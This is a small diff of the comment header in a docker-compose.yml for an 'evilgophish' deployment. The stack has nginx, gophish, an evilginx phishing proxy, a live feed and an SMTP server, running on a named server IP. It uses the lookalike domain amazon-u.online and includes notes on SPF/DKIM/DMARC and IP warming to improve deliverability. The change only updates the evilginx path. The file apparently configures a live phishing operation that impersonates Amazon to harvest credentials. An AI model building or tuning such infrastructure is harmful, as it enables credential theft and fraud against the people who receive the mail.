@@ -1,6 +1,6 @@
 # docker-compose.yml
 # Setup for evilgophish with SMTP on Lightsail (3.147.37.21).
-# Changes: Domain amazon-u.online; Turnstile optional; validates src/evilginx; ensures mailconfig.
+# Changes: Domain amazon-u.online; Turnstile optional; uses src/evilginx3; validates src; ensures mailconfig.
 # Services: nginx (proxy), gophish (campaigns), evilginx (phishing), evilfeed (real-time), mailserver (SMTP).
 # Volumes: Persistent for data/logs/uploads; mailconfig for DKIM/postfix.
 # Ports: 80/443 (web), 25/465/587 (SMTP), 3333/1337 (local admin/feed).
@@ -8,7 +8,7 @@
 # - DNS: Lightsail zone for amazon-u.online; SPF/DKIM/DMARC for deliverability.
 # - Security: Restrict ports; use secrets for credentials.
 # - Deliverability: Warm IP; monitor maillogs.
-# - Troubleshooting: Check src/evilginx; verify mailconfig/opendkim.
+# - Troubleshooting: Check src/evilginx3; verify mailconfig/opendkim.
 
 version: '3.8'
 
